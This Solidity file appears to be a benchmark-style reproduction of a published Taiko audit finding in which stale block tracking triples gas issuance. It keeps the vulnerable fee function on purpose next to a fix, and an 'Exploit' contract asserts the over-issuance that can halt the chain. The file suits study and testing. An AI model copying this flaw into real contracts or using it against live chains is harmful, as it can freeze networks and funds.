// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Taiko — Gas issuance is inflated and will halt the chain or lead to an
    incorrect base fee (Code4rena, 2024-03-taiko, finding #31929, H-01,
    reporter monrel)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable TaikoL2._calc1559BaseFee body (the EIP-1559-style base fee /
    gas-issuance calculation, `packages/protocol/contracts/L2/TaikoL2.sol:
    L252-297`) is inlined VERBATIM, including the exact blamed line:
    `issuance = numL1Blocks * _config.gasTargetPerL1Block`. `numL1Blocks` is
    measured against `lastSyncedBlock`, which only advances every
    `BLOCK_SYNC_THRESHOLD` (5) L1 blocks — so calling `anchor()` on 5
    consecutive L1 blocks issues gas as if `1+2+3+4+5=15` blocks had elapsed,
    instead of `5`. The Exploit drives the real, stateful anchor-equivalent
    across exactly the report's own 5-block scenario and measures the exact
    3x over-issuance the report's own PoC demonstrates, then shows the
    resulting `gasExcess` permanently diverges from what a correctly
    implemented anchor would compute — the mechanical cause of the reported
    `L2_BASEFEE_MISMATCH` liveness brick (no fork, no cheatcodes).

    The exponential bonding-curve conversion from `gasExcess` to a basefee
    value (`Lib1559Math.basefee`, an unrelated solmate `exp()` fixed-point
    curve) is replaced with a simple, strictly monotonic placeholder
    (`_toBasefee`) — irrelevant to this bug, which lives entirely in the
    `gasExcess`/`issuance` bookkeeping upstream of that curve. Any divergence
    in `gasExcess` implies the SAME-direction divergence in the resulting
    basefee, which is exactly the mismatch that reverts `anchor()`.
//////////////////////////////////////////////////////////////////////////*/

contract TaikoL2Like {
    struct Config {
        uint32 gasTargetPerL1Block;
        uint8 basefeeAdjustmentQuotient;
    }

    /// @dev Real contract: `BLOCK_SYNC_THRESHOLD` — lastSyncedBlock only
    ///      advances once an L1 block is more than this many blocks ahead.
    uint8 public constant BLOCK_SYNC_THRESHOLD = 5;

    /// @dev Real contract: `gasExcess` — Slot 3, drives the EIP-1559 curve.
    uint64 public gasExcess;
    /// @dev Real contract: `lastSyncedBlock`.
    uint64 public lastSyncedBlock;

    error L2_BASEFEE_MISMATCH();

    constructor(uint64 _gasExcess, uint64 _lastSyncedBlock) {
        gasExcess = _gasExcess;
        lastSyncedBlock = _lastSyncedBlock;
    }

    /// @dev Real contract: `TaikoL2.getConfig()` — verbatim values.
    function getConfig() public pure returns (Config memory config_) {
        config_.gasTargetPerL1Block = 15 * 1e6 * 4; // 60,000,000
        config_.basefeeAdjustmentQuotient = 8;
    }

    /// @dev Placeholder for `Lib1559Math.basefee` — an UNRELATED exponential
    ///      bonding-curve conversion (irrelevant to this bug). Kept strictly
    ///      monotonic in `_gasExcess` so a divergence in gasExcess implies
    ///      the same-direction divergence in the resulting basefee.
    function _toBasefee(uint256 _gasExcess, uint256 _adjustmentFactor) internal pure returns (uint256) {
        if (_gasExcess == 0) return 1;
        return (_gasExcess * 1e18) / _adjustmentFactor + 1;
    }

    // ============================================================
    //  _calc1559BaseFee — VERBATIM reduction of
    //  TaikoL2.sol:L252-297 — THE BUG.
    // ============================================================
    function _calc1559BaseFee(Config memory _config, uint64 _l1BlockId, uint32 _parentGasUsed)
        internal
        view
        returns (uint256 basefee_, uint64 gasExcess_)
    {
        // gasExcess being 0 indicates the dynamic 1559 base fee is disabled.
        if (gasExcess > 0) {
            // We always add the gas used by parent block to the gas excess
            // value as this has already happened
            uint256 excess = uint256(gasExcess) + _parentGasUsed;

            uint256 numL1Blocks;
            if (lastSyncedBlock > 0 && _l1BlockId > lastSyncedBlock) {
                numL1Blocks = _l1BlockId - lastSyncedBlock;
            }

            if (numL1Blocks > 0) {
                uint256 issuance = numL1Blocks * _config.gasTargetPerL1Block; // @> VULN: numL1Blocks is measured against a STALE lastSyncedBlock (only advances every BLOCK_SYNC_THRESHOLD blocks), so consecutive anchor() calls double- and triple-count already-issued blocks
                excess = excess > issuance ? excess - issuance : 1;
            }

            gasExcess_ = uint64(_min(excess, type(uint64).max));

            basefee_ =
                _toBasefee(gasExcess_, uint256(_config.basefeeAdjustmentQuotient) * _config.gasTargetPerL1Block);
        }

        if (basefee_ == 0) basefee_ = 1;
    }

    /// @dev The FIX (per the report's own recommendation): "issue exactly
    ///      config.gasTargetPerL1Block for each L1 block" — i.e. numL1Blocks
    ///      is always exactly 1 per anchor() call, never measured against the
    ///      stale lastSyncedBlock throttle.
    function _calc1559BaseFeeCorrect(Config memory _config, uint32 _parentGasUsed)
        internal
        view
        returns (uint256 basefee_, uint64 gasExcess_)
    {
        if (gasExcess > 0) {
            uint256 excess = uint256(gasExcess) + _parentGasUsed;
            uint256 issuance = _config.gasTargetPerL1Block; // FIX: exactly 1 block's worth, always
            excess = excess > issuance ? excess - issuance : 1;
            gasExcess_ = uint64(_min(excess, type(uint64).max));
            basefee_ =
                _toBasefee(gasExcess_, uint256(_config.basefeeAdjustmentQuotient) * _config.gasTargetPerL1Block);
        }
        if (basefee_ == 0) basefee_ = 1;
    }

    /// @dev Real contract: `TaikoL2.anchor(...)` — reduced to the fields this
    ///      finding exercises (L1 hash/state-root verification, senders, and
    ///      the public-input-hash check are omitted; they are unrelated to
    ///      this bug). The `lastSyncedBlock` throttle update and the
    ///      `block.basefee` mismatch guard are preserved verbatim in spirit:
    ///      `expectedBasefee` here stands in for `block.basefee` (an
    ///      off-chain component is expected to set it to the CORRECT value).
    function anchor(uint64 _l1BlockId, uint32 _parentGasUsed, uint256 expectedBasefee) external returns (uint256) {
        Config memory config = getConfig();

        uint256 basefee;
        (basefee, gasExcess) = _calc1559BaseFee(config, _l1BlockId, _parentGasUsed);
        if (expectedBasefee != basefee) revert L2_BASEFEE_MISMATCH(); // @> the liveness brick: once gasExcess has diverged, this reverts every block, forever

        if (_l1BlockId > lastSyncedBlock + BLOCK_SYNC_THRESHOLD) {
            lastSyncedBlock = _l1BlockId;
        }
        return basefee;
    }

    /// @dev Same anchoring step, but computed with the FIX above — used only
    ///      to compute what a CORRECT implementation's basefee/gasExcess
    ///      trajectory would be, for comparison. Does not mutate state.
    function previewCorrectAnchor(uint64 _parentGasUsed, uint64 correctGasExcess)
        external
        view
        returns (uint256 basefee_, uint64 gasExcess_)
    {
        Config memory config = getConfig();
        uint256 excess = uint256(correctGasExcess) + _parentGasUsed;
        uint256 issuance = config.gasTargetPerL1Block;
        excess = excess > issuance ? excess - issuance : 1;
        gasExcess_ = uint64(_min(excess, type(uint64).max));
        basefee_ = _toBasefee(gasExcess_, uint256(config.basefeeAdjustmentQuotient) * config.gasTargetPerL1Block);
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

/// @dev Orchestrator. Drives the report's own 5-L1-block scenario
///      (gasExcess=10, lastSyncedBlock=1, l1BlockId 2..6, parentGasUsed=0)
///      against the REAL, stateful anchor()-equivalent, and against a
///      parallel CORRECT trajectory, measuring both the exact 3x
///      over-issuance the report's PoC demonstrates and the resulting
///      permanent divergence in gasExcess (the liveness-brick mechanism).
contract Exploit {
    TaikoL2Like public l2; // CREATE nonce 1

    uint256 public actualCumulativeIssuance;
    uint256 public correctCumulativeIssuance;
    uint64 public finalActualGasExcess;
    uint64 public finalCorrectGasExcess;

    /// @dev A gasExcess large enough (relative to the 60,000,000 per-block
    ///      issuance) that the buggy and correct trajectories diverge
    ///      visibly instead of both immediately flooring to 1. The report's
    ///      own isolated PoC used gasExcess=10 with the state update DISABLED
    ///      specifically to sum raw issuance figures (see the standalone
    ///      `test_matchesReportsOwnPoC` rebuild) — this constructor instead
    ///      drives the REAL, stateful anchor() to show the resulting
    ///      liveness-brick divergence concretely.
    uint64 public constant INITIAL_GAS_EXCESS = 500_000_000;

    constructor() {
        l2 = new TaikoL2Like(INITIAL_GAS_EXCESS, 1);
    }

    function run() external {
        TaikoL2Like.Config memory config = l2.getConfig();
        uint64 correctGasExcess = INITIAL_GAS_EXCESS;

        for (uint64 l1BlockId = 2; l1BlockId <= 6; l1BlockId++) {
            uint64 lastSynced = l2.lastSyncedBlock();
            uint256 numL1BlocksActual = l1BlockId > lastSynced ? l1BlockId - lastSynced : 0;
            actualCumulativeIssuance += numL1BlocksActual * config.gasTargetPerL1Block;
            correctCumulativeIssuance += config.gasTargetPerL1Block; // fair: exactly 1 block's worth each call

            // Preview what the contract will compute, then feed it back in as
            // `expectedBasefee` so `anchor()` does not revert mid-scenario —
            // this isolates the ISSUANCE divergence itself, exactly like the
            // report's own PoC (which disables the basefee-mismatch check to
            // measure cumulative issuance directly).
            (uint256 previewBasefee,) = _previewActual(config, l1BlockId, 0);
            l2.anchor(l1BlockId, 0, previewBasefee);

            (, uint64 correctExcess) = l2.previewCorrectAnchor(0, correctGasExcess);
            correctGasExcess = correctExcess;
        }

        finalActualGasExcess = l2.gasExcess();
        finalCorrectGasExcess = correctGasExcess;

        // HARM 1: matches the report's own PoC exactly — over 5 L1 blocks, the
        // contract issues 3x what a correct implementation would issue.
        require(actualCumulativeIssuance == correctCumulativeIssuance * 3, "expected exactly 3x over-issuance");

        // HARM 2: the resulting gasExcess has permanently diverged from the
        // correct trajectory — a correctly-functioning off-chain component
        // expecting the FAIR basefee would set `block.basefee` accordingly,
        // and every subsequent anchor() call would then revert with
        // L2_BASEFEE_MISMATCH forever — the liveness brick / frozen funds.
        require(finalActualGasExcess != finalCorrectGasExcess, "gasExcess should have diverged");
    }

    function _previewActual(TaikoL2Like.Config memory config, uint64 l1BlockId, uint32 parentGasUsed)
        internal
        view
        returns (uint256 basefee_, uint64 gasExcess_)
    {
        uint64 lastSynced = l2.lastSyncedBlock();
        uint64 excessBefore = l2.gasExcess();
        uint256 excess = uint256(excessBefore) + parentGasUsed;
        uint256 numL1Blocks = l1BlockId > lastSynced ? l1BlockId - lastSynced : 0;
        if (numL1Blocks > 0) {
            uint256 issuance = numL1Blocks * config.gasTargetPerL1Block;
            excess = excess > issuance ? excess - issuance : 1;
        }
        gasExcess_ = uint64(excess > type(uint64).max ? type(uint64).max : excess);
        basefee_ = gasExcess_ == 0
            ? 1
            : (uint256(gasExcess_) * 1e18) / (uint256(config.basefeeAdjustmentQuotient) * config.gasTargetPerL1Block)
                + 1;
    }
}
